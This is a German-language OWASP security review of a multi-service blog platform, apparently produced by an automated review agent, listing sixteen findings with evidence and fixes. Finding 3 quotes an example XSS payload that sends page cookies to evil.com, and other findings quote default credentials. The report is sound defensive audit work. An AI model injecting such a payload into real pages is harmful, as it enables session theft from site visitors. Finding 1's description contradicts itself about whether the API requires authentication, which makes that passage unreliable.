# OWASP Security Review

| Field       | Value                                    |
| ----------- | ---------------------------------------- |
| Datum       | 2026-05-03                               |
| Zeit        | 14:00 UTC                                |
| Version     | 0.7.3-SNAPSHOT                           |
| Commit      | (siehe `git rev-parse HEAD`)             |
| Prüfer      | Security Review Agent                    |

## Umfang der Prüfung

Geprüft wurden alle Services und Bibliotheken des Toms-Blog-Monorepos:

- **blog-content** Service (REST-API, Thymeleaf-UI, Spring Security, JPA-Persistenz, gRPC-Client, Markdown-Rendering)
- **user-management** Service (REST-API, gRPC-Server, JPA-Persistenz, Benutzerprofil- und Tenant-Verwaltung)
- **shared-kernel** Bibliothek (Domain-Primitives, TenantId, AuthorId, Auditable)
- **event-contracts** Bibliothek (Domain-Event-Definitionen)
- **Infrastruktur** (Dockerfile, docker-compose.yml, Kubernetes-Manifeste, Secrets, Network Policies, Ingress)

Besonderer Fokus lag auf Multi-Tenant-Isolation, Authentifizierung/Autorisierung, Input-Validierung und sicherer Konfiguration.

## Prüfungen

### A01: Broken Access Control

- REST-API-Endpunkte: Prüfung ob alle CRUD-Operationen den `X-Tenant-Id`-Header auswerten und Tenant-Isolation in Repository-Queries durchsetzen
- Thymeleaf-UI: Prüfung der SecurityFilterChain-Konfiguration auf korrekte Zugriffskontrolle für öffentliche vs. authentifizierte Bereiche
- Admin-Bereich: Prüfung der Break-Glass-Admin-Filter-Chain (Order 1) auf korrekte Rollenbeschränkung
- User-Management-API: Prüfung ob Endpunkte für Benutzerverwaltung (approve, reject, sync) geschützt sind
- API-Endpunkte auf IDOR-Anfälligkeit geprüft (Zugriff auf Posts/Tags/Translations über UUIDs)

**Ergebnis:** REST-API-Controller (`PostController`, `TagController`, `TranslationController`) leiten den `X-Tenant-Id`-Header konsistent an die Service-Schicht weiter. Repository-Queries filtern konsequent nach `tenantId`. Die `BlogViewController` (Thymeleaf) nutzt ebenfalls den Tenant-Header. Allerdings bestehen mehrere Findings (siehe unten).

### A02: Cryptographic Failures

- Überprüfung der Passwort-Speicherung (BCrypt für Admin-Benutzer)
- OIDC-Konfiguration: Client-Secret-Verwaltung, JWK-Set-URI
- TLS-Konfiguration in Kubernetes (Ingress mit Let's Encrypt)
- gRPC-Kommunikation zwischen Services auf Verschlüsselung geprüft
- Datenbank-Passwörter in Konfigurationsdateien auf sichere Handhabung geprüft

**Ergebnis:** BCrypt wird für den Break-Glass-Admin verwendet. OIDC-Client-Secret wird über Umgebungsvariablen injiziert. K8s-Secrets werden mit SOPS/age verschlüsselt. Allerdings bestehen Findings bezüglich gRPC-Plaintext und Datenbank-Credentials.

### A03: Injection

- SQL-Injection: Prüfung aller Spring Data JPA Queries, Native Queries, JPQL-Queries
- Fulltext-Search: Native Query mit `plainto_tsquery` gegen SQL-Injection geprüft
- HTML/Script-Injection: Thymeleaf-Templates auf `th:utext`-Verwendung geprüft
- Markdown-Rendering: Flexmark-Markdown-to-HTML-Konvertierung auf XSS-Vektoren geprüft
- Slug-Validierung: Regex-basierte Validierung gegen Injection geprüft

**Ergebnis:** JPA-Queries verwenden parametrisierte Abfragen. Die native Fulltext-Query verwendet `@Param`-Bindings und `plainto_tsquery` (das Sonderzeichen neutralisiert). Allerdings besteht ein XSS-Risiko durch `th:utext` + Markdown-Rendering (siehe Finding).

### A04: Insecure Design

- Hexagonale Architektur: Prüfung der Schichtentrennung (Domain frei von Framework-Abhängigkeiten)
- Multi-Tenant-Design: Prüfung des Tenant-Isolation-Konzepts via Header
- Autorisierungsmodell: Prüfung der rollenbasierten Zugriffskontrolle
- Domain-Validierung: Prüfung der Input-Validierung in Domain-Objekten (Slug, Source, Post)

**Ergebnis:** Die hexagonale Architektur ist sauber umgesetzt. Das Tenant-Isolation-Design über Headers ist für Phase 1 angemessen, birgt aber Risiken (siehe Findings).

### A05: Security Misconfiguration

- Spring Security: CSRF-Konfiguration, HTTP Basic, CORS
- Actuator-Endpunkte: Prüfung welche Endpunkte öffentlich zugänglich sind
- Swagger/OpenAPI: Prüfung ob API-Dokumentation in Produktion zugänglich ist
- Kubernetes: SecurityContext, NetworkPolicies, Pod-Konfiguration
- Default-Credentials: Prüfung auf hartcodierte Standardpasswörter

**Ergebnis:** Mehrere Findings bezüglich CSRF-Deaktivierung, Default-Credentials und fehlender Security-Konfiguration im user-management Service.

### A06: Vulnerable and Outdated Components

- Spring Boot Version: 3.5.14 (aktuell überprüft)
- Java-Version: 25 (aktuell)
- Abhängigkeiten: gRPC 1.72.0, Testcontainers 1.21.4, Flexmark, springdoc 2.8.8
- Docker-Base-Images: eclipse-temurin:25-jre-alpine, PostgreSQL 17, Redis 7, Kafka 3.9.0

**Ergebnis:** Alle Hauptabhängigkeiten sind auf aktuellem Stand. Es wird kein bekanntes CVE in den verwendeten Versionen identifiziert. Empfehlung: regelmäßige Dependency-Scans einrichten.

### A07: Identification and Authentication Failures

- OIDC-Integration: Prüfung der OAuth2-Login-Konfiguration
- Break-Glass-Admin: Prüfung der InMemory-User-Konfiguration
- Passwort-Policy: Prüfung der Passwort-Anforderungen
- Session-Management: Prüfung der Session-Konfiguration
- Benutzer-Genehmigungsworkflow: Prüfung des Approval-Status

**Ergebnis:** Findings bezüglich Default-Admin-Passwort und fehlender Rate-Limiting.

### A08: Software and Data Integrity Failures

- Flyway-Migrationen: Prüfung auf sichere Schemaänderungen
- Docker-Image-Builds: Prüfung des Dockerfiles auf Supply-Chain-Sicherheit
- Kubernetes-Deployment: Prüfung der Image-Policy (Flux-Image-Automation)
- Event-Integrität: Prüfung der Domain-Event-Veröffentlichung

**Ergebnis:** Flyway-Migrationen sind sauber. Dockerfile verwendet ein vertrauenswürdiges Base-Image. Flux-Image-Automation ist konfiguriert.

### A09: Security Logging and Monitoring Failures

- Logging: Prüfung ob sicherheitsrelevante Ereignisse geloggt werden
- Audit-Trail: Prüfung der Auditable-Implementierung
- Fehlerbehandlung: Prüfung ob Stacktraces an Clients geleakt werden

**Ergebnis:** Basis-Logging ist vorhanden (SLF4J/Logback). Audit-Felder (createdBy, updatedBy) existieren, werden aber nicht befüllt. EventPublisher ist nur ein Logger-Stub.

### A10: Server-Side Request Forgery (SSRF)

- Source-URLs: Prüfung ob Benutzer-eingegebene URLs serverseitig aufgelöst werden
- OIDC-Provider-URIs: Prüfung der OIDC-Konfiguration auf manipulierbare Endpoints
- gRPC-Client-Adressen: Prüfung der Service-Adress-Konfiguration

**Ergebnis:** Source-URLs werden nur gespeichert und im Template als Links angezeigt, nicht serverseitig aufgelöst. Kein direktes SSRF-Risiko identifiziert.

## Findings

| #  | Severity      | OWASP | Titel                                                    | Betroffene Datei(en)                                                |
| -- | ------------- | ----- | -------------------------------------------------------- | ------------------------------------------------------------------- |
| 1  | High          | A01   | REST-API ohne Authentifizierung                          | SecurityConfiguration.java                                          |
| 2  | High          | A01   | User-Management-Service komplett ohne Authentifizierung   | user-management (gesamter Service)                                  |
| 3  | High          | A03   | XSS-Risiko durch unsanitisierten Markdown-Output          | FlexmarkMarkdownRenderer.java, show.html, list.html                |
| 4  | High          | A05   | Default-Admin-Passwort "admin"                            | AdminProperties.java, application.yml                               |
| 5  | Medium        | A01   | Tenant-ID aus nicht vertrauenswürdigem Header             | DefaultTenantFilter.java, alle REST-Controller                      |
| 6  | Medium        | A02   | gRPC-Kommunikation im Plaintext                           | application.yml (grpc.client.negotiation-type: plaintext)           |
| 7  | Medium        | A05   | CSRF-Schutz für API-Endpunkte deaktiviert                 | SecurityConfiguration.java                                          |
| 8  | Medium        | A05   | Swagger-UI in Produktion öffentlich zugänglich             | SecurityConfiguration.java, application.yml                         |
| 9  | Medium        | A05   | Kubernetes-Deployment ohne SecurityContext                 | deployment.yaml                                                     |
| 10 | Medium        | A09   | Audit-Felder (createdBy, updatedBy) werden nicht befüllt  | PostJpaEntity.java                                                  |
| 11 | Low           | A05   | Hardcoded Credentials in docker-compose.yml                | docker-compose.yml                                                  |
| 12 | Low           | A07   | Kein Rate-Limiting für Login-Endpunkte                     | SecurityConfiguration.java                                          |
| 13 | Low           | A10   | Keine URL-Validierung bei Source-URLs                      | Source.java, AddSourceRequest.java                                  |
| 14 | Informational | A02   | JPA show-sql in local-Profil aktiviert                     | application-local.yml                                               |
| 15 | Informational | A06   | Keine automatisierten Dependency-Vulnerability-Scans       | pom.xml                                                             |
| 16 | Informational | A09   | EventPublisher ist nur ein Logging-Stub                    | LoggingEventPublisher.java                                          |

---

### Finding 1: REST-API ohne Authentifizierung

**Severity:** High
**OWASP Category:** A01 - Broken Access Control
**Betroffene Dateien:** [SecurityConfiguration.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/inbound/web/SecurityConfiguration.java)

**Beschreibung:**
Die REST-API unter `/api/**` ist nicht authentifizierungspflichtig. Zwar matcht `.anyRequest().authenticated()` in der Default-Filter-Chain theoretisch auch API-Requests, doch durch die CSRF-Ausnahme (`csrf.ignoringRequestMatchers("/api/**")`) und die Konfiguration von HTTP Basic ohne explizite API-Schutzregeln kann jeder unauthentifizierte Client die gesamte API nutzen, sofern er den `X-Tenant-Id`-Header setzt. Die `.anyRequest().authenticated()` Regel greift, allerdings ist `httpBasic` aktiviert, was bedeutet, dass die API zwar geschützt ist, aber Credentials unverschlüsselt übertragen werden könnten (ohne TLS). Zudem fehlt eine explizite Autorisierung (Rollenbeschränkung) für schreibende API-Operationen.

**Beweis:**
```java
// SecurityConfiguration.java - defaultFilterChain
.anyRequest()
.authenticated())
// ...
.httpBasic(basic -> {})
.csrf(csrf -> csrf.ignoringRequestMatchers("/api/**"));
```

Schreibende Endpunkte wie `POST /api/posts`, `DELETE /api/posts/{id}`, `POST /api/posts/{postId}/sources` sind zwar authentifizierungspflichtig, aber jeder authentifizierte Benutzer (auch READER) kann Posts erstellen, bearbeiten und löschen.

**Empfohlener Fix:**
```java
// Explizite Rollenbeschränkung für API-Endpunkte:
.requestMatchers(HttpMethod.GET, "/api/**").authenticated()
.requestMatchers(HttpMethod.POST, "/api/**").hasAnyRole("AUTHOR", "ADMIN", "SUPERADMIN")
.requestMatchers(HttpMethod.PUT, "/api/**").hasAnyRole("AUTHOR", "ADMIN", "SUPERADMIN")
.requestMatchers(HttpMethod.DELETE, "/api/**").hasAnyRole("ADMIN", "SUPERADMIN")
```

---

### Finding 2: User-Management-Service komplett ohne Authentifizierung

**Severity:** High
**OWASP Category:** A01 - Broken Access Control
**Betroffene Dateien:** [user-management/pom.xml](services/user-management/pom.xml), gesamter user-management Service

**Beschreibung:**
Der User-Management-Service hat keine Spring-Security-Abhängigkeit und somit keinerlei Authentifizierung oder Autorisierung. Alle REST-Endpunkte (`/api/users/sync/oidc`, `/api/users/sync/internal`, `/api/users/{identifier}/approve`, `/api/users/{identifier}/reject`, `/api/tenants/{tenantId}/settings`) sowie alle gRPC-Endpunkte sind ohne jede Zugangskontrolle erreichbar.

Ein Angreifer mit Netzwerkzugang zum Service könnte:
- Beliebige Benutzer anlegen und genehmigen
- Tenant-Einstellungen (Login-Mode, Auto-Approval) manipulieren
- Benutzer mit Admin-Rollen versehen

**Beweis:**
```xml
<!-- user-management/pom.xml - Keine Security-Abhängigkeit -->
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <!-- FEHLT: spring-boot-starter-security -->
</dependencies>
```

**Empfohlener Fix:**
1. `spring-boot-starter-security` als Abhängigkeit hinzufügen
2. Service-to-Service-Authentifizierung implementieren (mTLS via Linkerd oder API-Token)
3. Für gRPC: `grpc-server-spring-boot-starter` unterstützt Interceptoren für Authentifizierung
4. K8s-NetworkPolicies schränken den Zugang bereits ein (nur intra-namespace), aber Defense-in-Depth erfordert auch Anwendungsebene-Schutz

---

### Finding 3: XSS-Risiko durch unsanitisierten Markdown-Output

**Severity:** High
**OWASP Category:** A03 - Injection
**Betroffene Dateien:** [FlexmarkMarkdownRenderer.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/outbound/markdown/FlexmarkMarkdownRenderer.java), [show.html](services/blog-content/src/main/resources/templates/posts/show.html#L22), [list.html](services/blog-content/src/main/resources/templates/posts/list.html#L32)

**Beschreibung:**
Der `FlexmarkMarkdownRenderer` konvertiert Markdown-Inhalte zu HTML ohne jegliche Sanitisierung. Der resultierende HTML-Output wird in Thymeleaf-Templates mit `th:utext` (unescaped) ausgegeben. Ein Angreifer, der einen Blog-Post erstellt, kann beliebiges JavaScript einschleusen.

Markdown erlaubt inline-HTML, sodass ein Angreifer z.B. `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` in den Post-Inhalt einfügen kann.

**Beweis:**
```java
// FlexmarkMarkdownRenderer.java
public String renderToHtml(String markdown) {
    if (markdown == null || markdown.isBlank()) {
        return "";
    }
    Node document = parser.parse(markdown);
    return renderer.render(document); // Keine Sanitisierung!
}
```

```html
<!-- show.html -->
<div th:utext="${renderedContent}">  <!-- Unescaped HTML output -->
```

**Empfohlener Fix:**
HTML-Sanitisierung nach dem Markdown-Rendering einbauen, z.B. mit OWASP Java HTML Sanitizer:
```java
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

private static final PolicyFactory POLICY = Sanitizers.FORMATTING
    .and(Sanitizers.BLOCKS)
    .and(Sanitizers.LINKS)
    .and(Sanitizers.IMAGES)
    .and(Sanitizers.TABLES);

@Override
public String renderToHtml(String markdown) {
    if (markdown == null || markdown.isBlank()) {
        return "";
    }
    Node document = parser.parse(markdown);
    String html = renderer.render(document);
    return POLICY.sanitize(html);
}
```

---

### Finding 4: Default-Admin-Passwort "admin"

**Severity:** High
**OWASP Category:** A05 - Security Misconfiguration
**Betroffene Dateien:** [AdminProperties.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/inbound/web/AdminProperties.java), [application.yml](services/blog-content/src/main/resources/application.yml#L36)

**Beschreibung:**
Der Break-Glass-Admin-Account hat "admin"/"admin" als Standardzugangsdaten. Sowohl im `AdminProperties`-Record (Compact-Constructor-Defaults) als auch in `application.yml` wird "admin" als Fallback gesetzt. Wird die Umgebungsvariable `BLOG_ADMIN_PASSWORD` nicht konfiguriert, ist der SUPERADMIN-Zugang mit trivialen Credentials erreichbar.

Obwohl in K8s das Passwort über ein SOPS-verschlüsseltes Secret injiziert wird, könnte ein Entwickler lokal den Service mit den Default-Credentials starten. Der Admin-Login unter `/admin/login` ist öffentlich erreichbar.

**Beweis:**
```java
// AdminProperties.java
public AdminProperties {
    if (password == null || password.isBlank()) {
        password = "admin"; // Unsicherer Default!
    }
}
```

```yaml
# application.yml
blog:
  admin:
    password: ${BLOG_ADMIN_PASSWORD:admin}
```

**Empfohlener Fix:**
1. Keinen Default-Wert für das Admin-Passwort setzen; stattdessen Startup abbrechen, wenn kein Passwort konfiguriert ist:
```java
public AdminProperties {
    if (username == null || username.isBlank()) {
        username = "admin";
    }
    if (password == null || password.isBlank()) {
        throw new IllegalStateException(
            "blog.admin.password must be configured. "
            + "Set BLOG_ADMIN_PASSWORD environment variable.");
    }
}
```
2. In `application.yml` den Default-Wert entfernen: `password: ${BLOG_ADMIN_PASSWORD}`

---

### Finding 5: Tenant-ID aus nicht vertrauenswürdigem Header

**Severity:** Medium
**OWASP Category:** A01 - Broken Access Control
**Betroffene Dateien:** [DefaultTenantFilter.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/inbound/web/DefaultTenantFilter.java), alle REST-Controller

**Beschreibung:**
Die Tenant-Isolation basiert auf dem `X-Tenant-Id`-HTTP-Header, der vom Client gesetzt oder vom `DefaultTenantFilter` mit einem Standardwert befüllt wird. Ein authentifizierter Benutzer kann durch Manipulation des `X-Tenant-Id`-Headers auf Daten eines anderen Tenants zugreifen.

Der `DefaultTenantFilter` injiziert nur dann einen Standardwert, wenn kein Header vorhanden ist. Sendet ein Client einen beliebigen `X-Tenant-Id`-Header, wird dieser ungeprüft durchgereicht. Es fehlt eine Validierung, ob der authentifizierte Benutzer tatsächlich Zugriff auf den angegebenen Tenant hat.

**Beweis:**
```java
// DefaultTenantFilter.java
protected void doFilterInternal(...) {
    boolean missingTenant = request.getHeader("X-Tenant-Id") == null;
    // Wenn Header gesetzt: wird ungeprüft durchgereicht!
    if (missingTenant || missingAuthor) {
        filterChain.doFilter(new DefaultHeaderRequestWrapper(...), response);
    } else {
        filterChain.doFilter(request, response);
    }
}
```

**Empfohlener Fix:**
1. Phase 1 (kurzfristig): In einer Filter-Chain den Tenant-Header gegen die Tenant-Memberships des authentifizierten Benutzers validieren
2. Phase 2 (ADR-0012): Domain-basierte Tenant-Auflösung implementieren, sodass der Tenant aus dem Host-Header abgeleitet wird und nicht vom Client manipuliert werden kann
3. Für die REST-API: Tenant-ID aus dem authentifizierten Principal ableiten, nicht aus dem Request-Header

---

### Finding 6: gRPC-Kommunikation im Plaintext

**Severity:** Medium
**OWASP Category:** A02 - Cryptographic Failures
**Betroffene Dateien:** [application.yml](services/blog-content/src/main/resources/application.yml#L39)

**Beschreibung:**
Die gRPC-Kommunikation zwischen blog-content und user-management ist als Plaintext konfiguriert (`negotiation-type: plaintext`). Sensitive Daten wie OIDC-Subjects, E-Mail-Adressen, Benutzerprofile und Rollen werden unverschlüsselt übertragen.

**Beweis:**
```yaml
grpc:
  client:
    user-management:
      address: static://${USER_MANAGEMENT_GRPC_HOST:localhost}:${USER_MANAGEMENT_GRPC_PORT:9090}
      negotiation-type: plaintext
```

**Empfohlener Fix:**
In K8s mit Linkerd (ADR-0021 Zero-Trust) wird mTLS auf Netzwerkebene erzwungen, was das Risiko im Cluster mindert. Für zusätzliche Defense-in-Depth:
1. TLS für gRPC konfigurieren: `negotiation-type: tls`
2. Oder auf die Linkerd-mTLS-Erzwingung vertrauen und dies explizit dokumentieren

---

### Finding 7: CSRF-Schutz für API-Endpunkte deaktiviert

**Severity:** Medium
**OWASP Category:** A05 - Security Misconfiguration
**Betroffene Dateien:** [SecurityConfiguration.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/inbound/web/SecurityConfiguration.java#L60)

**Beschreibung:**
CSRF-Schutz ist für alle Pfade unter `/api/**` deaktiviert (`csrf.ignoringRequestMatchers("/api/**")`). Dies ist in beiden Filter-Chains (Admin und Default) der Fall. Für eine rein token-basierte API (Bearer-Token) ist die CSRF-Deaktivierung vertretbar, allerdings ist HTTP Basic aktiviert, was Browser-basierte Authentifizierung ermöglicht. Ein Angreifer könnte Cross-Site-Requests gegen die API durchführen, wenn ein Browser HTTP-Basic-Credentials zwischenspeichert.

**Beweis:**
```java
// adminFilterChain
.csrf(csrf -> csrf.ignoringRequestMatchers("/api/**"));

// defaultFilterChain
.csrf(csrf -> csrf.ignoringRequestMatchers("/api/**"));
```

**Empfohlener Fix:**
1. HTTP Basic für die API deaktivieren und stattdessen Bearer-Token-Authentifizierung verwenden
2. Alternativ: CSRF für API-Endpunkte beibehalten, wenn Browser-basierte Authentifizierung gewünscht ist
3. Für die Admin-Filter-Chain ist die CSRF-Ausnahme unnötig, da `/admin/**` keine API-Endpunkte matcht

---

### Finding 8: Swagger-UI in Produktion öffentlich zugänglich

**Severity:** Medium
**OWASP Category:** A05 - Security Misconfiguration
**Betroffene Dateien:** [SecurityConfiguration.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/inbound/web/SecurityConfiguration.java#L78)

**Beschreibung:**
Swagger-UI und die OpenAPI-Spezifikation (`/swagger-ui/**`, `/api-docs/**`, `/v3/api-docs/**`) sind als `permitAll()` konfiguriert. In einer Produktionsumgebung gibt dies Angreifern detaillierte Informationen über die gesamte API-Struktur, erwartete Parameter und Datenmodelle.

**Beweis:**
```java
// SecurityConfiguration.java
.requestMatchers("/swagger-ui/**", "/swagger-ui.html", "/api-docs/**", "/v3/api-docs/**")
.permitAll()
```

**Empfohlener Fix:**
1. Swagger-UI nur in Entwicklungs- und Test-Profilen aktivieren:
```java
@Profile("!k8s")
@Bean
public OperationCustomizer tenantHeaderCustomizer() { ... }
```
2. In `application-k8s.yml`: `springdoc.api-docs.enabled: false` und `springdoc.swagger-ui.enabled: false`
3. Oder Swagger-UI hinter Authentifizierung setzen: `.requestMatchers("/swagger-ui/**", "/api-docs/**").hasRole("ADMIN")`

---

### Finding 9: Kubernetes-Deployment ohne SecurityContext

**Severity:** Medium
**OWASP Category:** A05 - Security Misconfiguration
**Betroffene Dateien:** [deployment.yaml](infra/k8s/blog-content/deployment.yaml)

**Beschreibung:**
Das Kubernetes-Deployment definiert keinen `securityContext` auf Pod- oder Container-Ebene. Best Practices erfordern:
- `runAsNonRoot: true`
- `readOnlyRootFilesystem: true`
- `allowPrivilegeEscalation: false`
- Capabilities droppen

Das Dockerfile erstellt zwar einen non-root User (`app`), aber ohne K8s-SecurityContext wird dies nicht auf Cluster-Ebene erzwungen.

**Beweis:**
```yaml
# deployment.yaml - Kein securityContext definiert
spec:
  containers:
    - name: blog-content
      image: ghcr.io/tomirgang/tomsblog/blog-content:0.7.2
      # FEHLT: securityContext
```

**Empfohlener Fix:**
```yaml
spec:
  securityContext:
    runAsNonRoot: true
    fsGroup: 1000
  containers:
    - name: blog-content
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        readOnlyRootFilesystem: true
        allowPrivilegeEscalation: false
        capabilities:
          drop:
            - ALL
```

---

### Finding 10: Audit-Felder (createdBy, updatedBy) werden nicht befüllt

**Severity:** Medium
**OWASP Category:** A09 - Security Logging and Monitoring Failures
**Betroffene Dateien:** [PostJpaEntity.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/outbound/persistence/PostJpaEntity.java)

**Beschreibung:**
Die `PostJpaEntity` implementiert das `Auditable`-Interface und hat `createdBy`/`updatedBy`-Felder, diese werden aber weder durch JPA-Auditing (`@CreatedBy`, `@LastModifiedBy`) noch manuell befüllt. Somit ist nicht nachvollziehbar, welcher Benutzer einen Post erstellt oder bearbeitet hat.

**Beweis:**
```java
@Column(name = "created_by")
private String createdBy;

@Column(name = "updated_by")
private String updatedBy;
// Kein @CreatedBy/@LastModifiedBy, kein AuditorAware-Bean
```

**Empfohlener Fix:**
1. Spring Data JPA Auditing aktivieren (`@EnableJpaAuditing`)
2. Ein `AuditorAware<String>`-Bean implementieren, das den aktuellen Benutzer aus dem SecurityContext liefert
3. `@CreatedBy` und `@LastModifiedBy` Annotationen an die Felder setzen

---

### Finding 11: Hardcoded Credentials in docker-compose.yml

**Severity:** Low
**OWASP Category:** A05 - Security Misconfiguration
**Betroffene Dateien:** [docker-compose.yml](infra/docker/docker-compose.yml)

**Beschreibung:**
Die `docker-compose.yml` enthält hartcodierte Credentials für PostgreSQL (`tomsblog`/`tomsblog`, `postgres`/`postgres`) und RabbitMQ (`tomsblog`/`tomsblog`). Diese Datei ist für die lokale Entwicklung gedacht, aber die Credentials könnten versehentlich in Produktionsumgebungen verwendet werden.

**Beweis:**
```yaml
postgres-blog-content:
  environment:
    POSTGRES_USER: tomsblog
    POSTGRES_PASSWORD: tomsblog

postgres-user-management:
  environment:
    POSTGRES_USER: postgres
    POSTGRES_PASSWORD: postgres

rabbitmq:
  environment:
    RABBITMQ_DEFAULT_USER: tomsblog
    RABBITMQ_DEFAULT_PASS: tomsblog
```

**Empfohlener Fix:**
1. Umgebungsvariablen oder `.env`-Dateien verwenden (`.env` in `.gitignore`)
2. Dokumentieren, dass diese Werte nur für lokale Entwicklung gelten
3. In der README auf die Trennung von Entwicklungs- und Produktions-Credentials hinweisen

---

### Finding 12: Kein Rate-Limiting für Login-Endpunkte

**Severity:** Low
**OWASP Category:** A07 - Identification and Authentication Failures
**Betroffene Dateien:** [SecurityConfiguration.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/inbound/web/SecurityConfiguration.java)

**Beschreibung:**
Die Login-Endpunkte (`/login`, `/admin/login`) haben kein Rate-Limiting. Ein Angreifer kann unbegrenzte Brute-Force-Versuche gegen den Break-Glass-Admin-Login durchführen.

**Empfohlener Fix:**
1. Spring Security bietet keinen eingebauten Rate-Limiter; Optionen:
   - Spring Cloud Gateway mit Rate-Limiting (bereits in der Architektur vorgesehen, ADR-0017)
   - `bucket4j-spring-boot-starter` für anwendungsebene Rate-Limiting
   - Traefik-Middleware für Rate-Limiting auf Ingress-Ebene
2. Account-Lockout nach N fehlgeschlagenen Versuchen implementieren

---

### Finding 13: Keine URL-Validierung bei Source-URLs

**Severity:** Low
**OWASP Category:** A10 - Server-Side Request Forgery (SSRF)
**Betroffene Dateien:** [Source.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/domain/model/Source.java), [AddSourceRequest.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/inbound/rest/AddSourceRequest.java)

**Beschreibung:**
Source-URLs werden nur auf "nicht leer" validiert. Es gibt keine Prüfung auf:
- Gültiges URL-Format
- Erlaubte Protokolle (nur `http`/`https`)
- Blockliste für interne IP-Adressen oder private Netzwerke

Obwohl die URLs aktuell nicht serverseitig aufgelöst werden (kein SSRF), könnten sie in Zukunft für Link-Previews oder ähnliche Features verwendet werden. Zudem könnten `javascript:`-URIs als XSS-Vektor in der Template-Ausgabe dienen.

**Beweis:**
```java
// Source.java
public Source {
    Objects.requireNonNull(url, "Source URL must not be null");
    if (url.isBlank()) {
        throw new IllegalArgumentException("Source URL must not be blank");
    }
    // Keine URL-Format-Validierung!
}
```

```html
<!-- show.html - URL wird direkt als href verwendet -->
<a th:href="${source.url()}" th:text="${source.title()}"
   rel="noopener noreferrer" target="_blank">Source Title</a>
```

**Empfohlener Fix:**
```java
public Source {
    Objects.requireNonNull(url, "Source URL must not be null");
    if (url.isBlank()) {
        throw new IllegalArgumentException("Source URL must not be blank");
    }
    if (!url.matches("^https?://.*")) {
        throw new IllegalArgumentException("Source URL must use http or https protocol");
    }
    try {
        new java.net.URI(url);
    } catch (java.net.URISyntaxException e) {
        throw new IllegalArgumentException("Source URL is not a valid URI", e);
    }
    // ...
}
```

---

### Finding 14: JPA show-sql in local-Profil aktiviert

**Severity:** Informational
**OWASP Category:** A02 - Cryptographic Failures
**Betroffene Dateien:** [application-local.yml](services/blog-content/src/main/resources/application-local.yml)

**Beschreibung:**
Im lokalen Profil ist `show-sql: true` mit `format_sql: true` aktiviert. Dies kann sensitive Daten (Abfrageparameter) in Log-Ausgaben schreiben. Solange dies nur lokal verwendet wird, ist das Risiko gering, es sollte aber bewusst gehandhabt werden.

**Empfohlener Fix:**
Akzeptabel für lokale Entwicklung. Sicherstellen, dass `show-sql: false` in allen nicht-lokalen Profilen gilt (ist in `application-k8s.yml` korrekt gesetzt).

---

### Finding 15: Keine automatisierten Dependency-Vulnerability-Scans

**Severity:** Informational
**OWASP Category:** A06 - Vulnerable and Outdated Components
**Betroffene Dateien:** [pom.xml](pom.xml)

**Beschreibung:**
Es gibt keine automatisierten Vulnerability-Scans für Abhängigkeiten (z.B. OWASP Dependency-Check, Snyk, Dependabot, Trivy). Obwohl die aktuellen Versionen auf dem neuesten Stand sind, könnten zukünftig bekannte Schwachstellen unentdeckt bleiben.

**Empfohlener Fix:**
1. OWASP Dependency-Check Maven Plugin einbinden
2. GitHub Dependabot oder Renovate für automatische Dependency-Updates aktivieren
3. Trivy für Container-Image-Scanning in die CI/CD-Pipeline integrieren

---

### Finding 16: EventPublisher ist nur ein Logging-Stub

**Severity:** Informational
**OWASP Category:** A09 - Security Logging and Monitoring Failures
**Betroffene Dateien:** [LoggingEventPublisher.java](services/blog-content/src/main/java/de/tomsblog/blogcontent/adapter/outbound/persistence/LoggingEventPublisher.java)

**Beschreibung:**
Der `EventPublisher` loggt Domain-Events nur per SLF4J, statt sie an Kafka zu senden. Sicherheitsrelevante Ereignisse (Post erstellt, veröffentlicht, aktualisiert) werden daher nicht persistent und zentralisiert erfasst. Eine nachträgliche Auditierung ist nur über Anwendungslogs möglich.

**Empfohlener Fix:**
Gemäß Roadmap (Phase 4) die Kafka-Integration implementieren. Bis dahin ist das Logging akzeptabel, sollte aber um strukturierte Felder erweitert werden (tenantId, userId, eventType).

---

## Potentielle Improvements

1. **Content Security Policy (CSP)**: HTTP-Response-Header mit einer restriktiven CSP konfigurieren, um XSS-Angriffe zusätzlich zu erschweren. Aktuell werden externe Skripte (highlight.js, mermaid) von CDNs geladen, was eine strikte CSP erschwert, aber `script-src` sollte mindestens auf bekannte Domains beschränkt werden.

2. **HTTP Security Headers**: Fehlende Security-Header wie `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Strict-Transport-Security` konfigurieren. Spring Security setzt einige davon per Default, aber explizite Konfiguration ist empfehlenswert.

3. **Input-Längen-Begrenzung**: REST-Request-DTOs sollten `@Size`-Constraints haben (z.B. Titel max. 500 Zeichen analog zur DB-Spalte, Content max. 1MB). Ohne diese Begrenzungen sind Denial-of-Service-Angriffe durch übermäßig große Payloads möglich.

4. **Strukturiertes Logging**: Aktuell wird Standard-SLF4J-Logging verwendet. Für effektives Security-Monitoring empfiehlt sich ein strukturiertes Logging-Format (JSON) mit Feldern wie `tenantId`, `userId`, `action`, `resourceType`, `resourceId`.

5. **Error-Response-Konsistenz**: Die `GlobalExceptionHandler` geben `ProblemDetail`-Responses zurück, die Exception-Messages enthalten. Diese sollten auf generische Fehlermeldungen beschränkt werden, um keine internen Details preiszugeben (z.B. Datenbankfehler, Stack-Traces).

6. **Passwort-Hash-Transport**: Die `SyncInternalUserRequest` akzeptiert einen `passwordHash`. Es sollte geprüft werden, ob der Hash clientseitig erstellt wird oder ob ein Klartext-Passwort über die API transportiert und serverseitig gehasht werden sollte.

7. **gRPC-Error-Details**: Die gRPC-Fehlerbehandlung im `UserManagementGrpcService` leitet Exception-Messages direkt an den Client weiter. Diese könnten interne Informationen enthalten.

